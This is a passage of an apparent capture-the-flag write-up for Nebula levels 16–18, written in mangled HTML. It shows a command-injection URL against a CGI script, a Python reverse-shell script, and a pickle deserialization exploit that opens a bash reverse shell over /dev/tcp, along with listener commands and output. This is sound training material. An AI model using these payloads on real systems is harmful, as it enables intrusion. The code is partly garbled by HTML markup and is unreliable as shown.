</span><span class='line'><span class="nv">$username</span> <span class="o">=~</span> <span class="sr">s/\s.*//</span><span class="p">;</span>    <span class="c1"># strip everything after a space&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="sr">&lt;p&gt;</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>We tried several other methods without success. In the later case, the shell runs, but we cannot do anything useful:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;a href="http://192.168.80.136:1616/index.cgi?username=$">http://192.168.80.136:1616/index.cgi?username=$&lt;/a>(CMD=YES;${CMD~~})&amp;password
</span><span class='line'>&lt;a href="http://192.168.80.136:1616/index.cgi?username=$">http://192.168.80.136:1616/index.cgi?username=$&lt;/a>($SHELL)&amp;password</span></code></pre></td></tr></table></div></figure></p>

<p>Our solution was to create uppercased file in /tmp/ and use * expansion, telling bash to find the correct directory.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>sh-4.2$ cat SH
</span><span class='line'>python -c &ldquo;import sys,socket,os,pty; _,ip,port=sys.argv; s=socket.socket(); s.connect((ip,int(port))); [os.dup2(s.fileno(),fd) for fd in (0,1,2)]; pty.spawn(&lsquo;/bin/bash&rsquo;)&rdquo; nebula 1337&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>sh-4.2$ chmod +x SH&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>sh-4.2$ nc -l 1337&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;h1>&lt;a href="http://192.168.80.136:1616/index.cgi?username=$">http://192.168.80.136:1616/index.cgi?username=$&lt;/a>(/*/SH)&lt;/h1>
</span><span class='line'>
</span><span class='line'>&lt;p>sh-4.2$ wget -q -O /dev/null &ldquo;&lt;a href="http://192.168.80.136:1616/index.cgi?username=%24">http://192.168.80.136:1616/index.cgi?username=%24&lt;/a>(/%2A/SH)&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>flag16@nebula:/home/flag16$ getflag
</span><span class='line'>getflag
</span><span class='line'>You have successfully executed getflag on a target account</span></code></pre></td></tr></table></div></figure></p>

<h2>Level17</h2>

<p><figure class='code'><figcaption><span>level17.py </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
</pre></td><td class='code'><pre><code class='py'><span class='line'><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="err">!</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">python</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="kn">import</span> <span class="nn">os</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">pickle</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">time</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">socket</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">signal</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">signal</span><span class="o">.</span><span class="n">signal</span><span class="p">(</span><span class="n">signal</span><span class="o">.</span><span class="n">SIGCHLD</span><span class="p">,</span> <span class="n">signal</span><span class="o">.</span><span class="n">SIG_IGN</span><span class="p">)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="k">def</span> <span class="nf">server</span><span class="p">(</span><span class="n">skt</span><span class="p">):</span>
</span><span class='line'>  <span class="n">line</span> <span class="o">=</span> <span class="n">skt</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="n">obj</span> <span class="o">=</span> <span class="n">pickle</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">line</span><span class="p">)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">obj</span><span class="p">:</span>
</span><span class='line'>      <span class="n">clnt</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">why</span> <span class="n">did</span> <span class="n">you</span> <span class="n">send</span> <span class="n">me</span> <span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span> <span class="o">+</span> <span class="n">i</span> <span class="o">+</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="err">?</span>\<span class="n">n</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">skt</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
</span><span class='line'><span class="n">skt</span><span class="o">.</span><span class="n">bind</span><span class="p">((</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="mf">0.0</span><span class="o">.</span><span class="mf">0.0</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span> <span class="mi">10007</span><span class="p">))</span>
</span><span class='line'><span class="n">skt</span><span class="o">.</span><span class="n">listen</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
</span><span class='line'>  <span class="n">clnt</span><span class="p">,</span> <span class="n">addr</span> <span class="o">=</span> <span class="n">skt</span><span class="o">.</span><span class="n">accept</span><span class="p">()</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="k">if</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">fork</span><span class="p">()</span> <span class="o">==</span> <span class="mi">0</span><span class="p">):</span>
</span><span class='line'>      <span class="n">clnt</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">Accepted</span> <span class="n">connection</span> <span class="kn">from</span> <span class="o">%</span><span class="n">s</span><span class="p">:</span><span class="o">%</span><span class="n">d</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span> <span class="o">%</span> <span class="p">(</span><span class="n">addr</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">addr</span><span class="p">[</span><span class="mi">1</span><span class="p">]))</span>
</span><span class='line'>      <span class="n">server</span><span class="p">(</span><span class="n">clnt</span><span class="p">)</span>
</span><span class='line'>      <span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>According <a href="https://docs.python.org/2/library/pickle.html">documentation</a> it is
not safe to use data from untrusted source, so <code>pickle.loads</code> on line 14 means RCE:</p>

<p><code>Warning The pickle module is not intended to be secure against erroneous or maliciously constructed data. Never unpickle data received from an untrusted or unauthenticated source.</code></p>

<p>Our exploit for executing remote shell:</p>

<p><figure class='code'><figcaption><span>exploit.py </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="err">!</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">env</span> <span class="n">python</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="kn">from</span> <span class="nn">cPickle</span> <span class="kn">import</span> <span class="n">dumps</span>
</span><span class='line'><span class="kn">from</span> <span class="nn">os</span>      <span class="kn">import</span> <span class="n">system</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="k">class</span> <span class="nc">Exploit</span><span class="p">(</span><span class="nb">object</span><span class="p">):</span>
</span><span class='line'>    <span class="k">def</span> <span class="err">&lt;</span><span class="nf">strong</span><span class="o">&gt;</span><span class="nb">reduce</span><span class="o">&lt;/</span><span class="n">strong</span><span class="o">&gt;</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span> <span class="k">return</span> <span class="p">(</span><span class="n">system</span><span class="p">,</span> <span class="p">(</span><span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">bash</span> <span class="o">-</span><span class="n">i</span> <span class="o">&gt;&amp;</span><span class="n">amp</span><span class="p">;</span> <span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">tcp</span><span class="o">/</span><span class="mf">0.0</span><span class="o">.</span><span class="mf">0.0</span><span class="o">/</span><span class="mi">1337</span> <span class="mi">0</span><span class="o">&gt;&amp;</span><span class="n">amp</span><span class="p">;</span><span class="mi">1</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,))</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="k">print</span> <span class="n">dumps</span><span class="p">(</span><span class="n">Exploit</span><span class="p">())</span>
</span></code></pre></td></tr></table></div></figure></p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;h1>Window 1:&lt;/h1>
</span><span class='line'>
</span><span class='line'>&lt;p>sh-4.2$ nc -l 1337&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;h1>Window 2:&lt;/h1>
</span><span class='line'>
</span><span class='line'>&lt;p>sh-4.2$ ./exploit.py
</span><span class='line'>cposix
</span><span class='line'>system
</span><span class='line'>p1
</span><span class='line'>(S'bash -i >&amp; /dev/tcp/0.0.0.0/1337 0>&amp;1'
</span><span class='line'>p2
</span><span class='line'>tp3
</span><span class='line'>Rp4
</span><span class='line'>.&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>sh-4.2$ ./exploit.py | nc nebula 10007
</span><span class='line'>Accepted connection from 127.0.0.1:42532&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;h1>Window 1:&lt;/h1>
</span><span class='line'>
</span><span class='line'>&lt;p>bash: no job control in this shell
</span><span class='line'>flag17@nebula:/$ getflag
</span><span class='line'>getflag
</span><span class='line'>You have successfully executed getflag on a target account</span></code></pre></td></tr></table></div></figure></p>

<h2>Level18</h2>

<p>According challenge info, there are several ways how to solve this challenge.</p>

<p><figure class='code'><figcaption><span>level18.c </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
<span class='line-number'>105</span>
<span class='line-number'>106</span>
<span class='line-number'>107</span>
<span class='line-number'>108</span>
<span class='line-number'>109</span>
<span class='line-number'>110</span>
<span class='line-number'>111</span>
<span class='line-number'>112</span>
<span class='line-number'>113</span>
<span class='line-number'>114</span>
<span class='line-number'>115</span>
<span class='line-number'>116</span>
<span class='line-number'>117</span>
<span class='line-number'>118</span>
<span class='line-number'>119</span>
<span class='line-number'>120</span>
<span class='line-number'>121</span>
<span class='line-number'>122</span>
<span class='line-number'>123</span>
<span class='line-number'>124</span>
<span class='line-number'>125</span>
<span class='line-number'>126</span>
<span class='line-number'>127</span>
<span class='line-number'>128</span>
<span class='line-number'>129</span>
<span class='line-number'>130</span>
<span class='line-number'>131</span>
<span class='line-number'>132</span>
<span class='line-number'>133</span>
<span class='line-number'>134</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">stdlib</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">unistd</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">string</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">stdio</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">sys</span><span class="o">/</span><span class="n">types</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">fcntl</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">getopt</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="k">struct</span> <span class="p">{</span>
</span><span class='line'>  <span class="kt">FILE</span> <span class="o">*</span><span class="n">debugfile</span><span class="p">;</span>
</span><span class='line'>  <span class="kt">int</span> <span class="n">verbose</span><span class="p">;</span>
</span><span class='line'>  <span class="kt">int</span> <span class="n">loggedin</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span> <span class="n">globals</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">define</span> <span class="n">dprintf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">hellip</span><span class="p">;)</span> <span class="k">if</span><span class="p">(</span><span class="n">globals</span><span class="p">.</span><span class="n">debugfile</span><span class="p">)</span> <span class="err">\</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="n">fprintf</span><span class="p">(</span><span class="n">globals</span><span class="p">.</span><span class="n">debugfile</span><span class="p">,</span> <span class="o">&lt;</span><span class="n">strong</span><span class="o">&gt;</span><span class="n">VA_ARGS</span><span class="o">&lt;/</span><span class="n">strong</span><span class="o">&gt;</span><span class="p">)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">define</span> <span class="n">dvprintf</span><span class="p">(</span><span class="n">num</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">hellip</span><span class="p">;)</span> <span class="k">if</span><span class="p">(</span><span class="n">globals</span><span class="p">.</span><span class="n">debugfile</span> <span class="o">&amp;</span><span class="n">amp</span><span class="p">;</span><span class="o">&amp;</span><span class="n">amp</span><span class="p">;</span> <span class="n">globals</span><span class="p">.</span><span class="n">verbose</span> <span class="o">&gt;=</span> <span class="n">num</span><span class="p">)</span> <span class="err">\</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="n">fprintf</span><span class="p">(</span><span class="n">globals</span><span class="p">.</span><span class="n">debugfile</span><span class="p">,</span> <span class="o">&lt;</span><span class="n">strong</span><span class="o">&gt;</span><span class="n">VA_ARGS</span><span class="o">&lt;/</span><span class="n">strong</span><span class="o">&gt;</span><span class="p">)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">define</span> <span class="n">PWFILE</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">flag18</span><span class="o">/</span><span class="n">password</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="kt">void</span> <span class="n">login</span><span class="p">(</span><span class="kt">char</span> <span class="o">&lt;</span><span class="n">em</span><span class="o">&gt;</span><span class="n">pw</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="kt">FILE</span> <span class="o">&lt;/</span><span class="n">em</span><span class="o">&gt;</span><span class="n">fp</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="n">fp</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="n">PWFILE</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">r</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;);</span>
</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">fp</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="kt">char</span> <span class="n">file</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">pre</span><span class="o">&gt;&lt;</span><span class="n">code</span><span class="o">&gt;</span>  <span class="k">if</span><span class="p">(</span><span class="n">fgets</span><span class="p">(</span><span class="n">file</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">file</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">,</span> <span class="n">fp</span><span class="p">)</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="n">dprintf</span><span class="p">(</span><span class="s">&quot;Unable to read password file %s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">PWFILE</span><span class="p">);</span>
</span><span class='line'>      <span class="k">return</span><span class="p">;</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>            <span class="n">fclose</span><span class="p">(</span><span class="n">fp</span><span class="p">);</span>
</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">strcmp</span><span class="p">(</span><span class="n">pw</span><span class="p">,</span> <span class="n">file</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="k">return</span><span class="p">;</span>
</span><span class='line'><span class="o">&lt;/</span><span class="n">code</span><span class="o">&gt;&lt;/</span><span class="n">pre</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="p">}</span>
</span><span class='line'>  <span class="n">dprintf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">logged</span> <span class="n">in</span> <span class="n">successfully</span> <span class="p">(</span><span class="n">with</span><span class="o">%</span><span class="n">s</span> <span class="n">password</span> <span class="n">file</span><span class="p">)</span><span class="err">\</span><span class="n">n</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;,</span>
</span><span class='line'>      <span class="n">fp</span> <span class="o">==</span> <span class="nb">NULL</span> <span class="o">?</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">out</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span> <span class="o">:</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;);</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="n">globals</span><span class="p">.</span><span class="n">loggedin</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="p">}</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="kt">void</span> <span class="n">notsupported</span><span class="p">(</span><span class="kt">char</span> <span class="o">&lt;</span><span class="n">em</span><span class="o">&gt;</span><span class="n">what</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="kt">char</span> <span class="o">&lt;/</span><span class="n">em</span><span class="o">&gt;</span><span class="n">buffer</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
</span><span class='line'>  <span class="n">asprintf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">amp</span><span class="p">;</span><span class="n">buffer</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="o">&amp;</span><span class="n">ndash</span><span class="p">;</span><span class="o">&gt;</span> <span class="p">[</span><span class="o">%</span><span class="n">s</span><span class="p">]</span> <span class="n">is</span> <span class="n">unsupported</span> <span class="n">at</span> <span class="n">this</span> <span class="n">current</span> <span class="n">time</span><span class="p">.</span><span class="err">\</span><span class="n">n</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;,</span> <span class="n">what</span><span class="p">);</span>
</span><span class='line'>  <span class="n">dprintf</span><span class="p">(</span><span class="n">what</span><span class="p">);</span>
</span><span class='line'>  <span class="n">free</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="kt">void</span> <span class="n">setuser</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">user</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="kt">char</span> <span class="n">msg</span><span class="p">[</span><span class="mi">128</span><span class="p">];</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
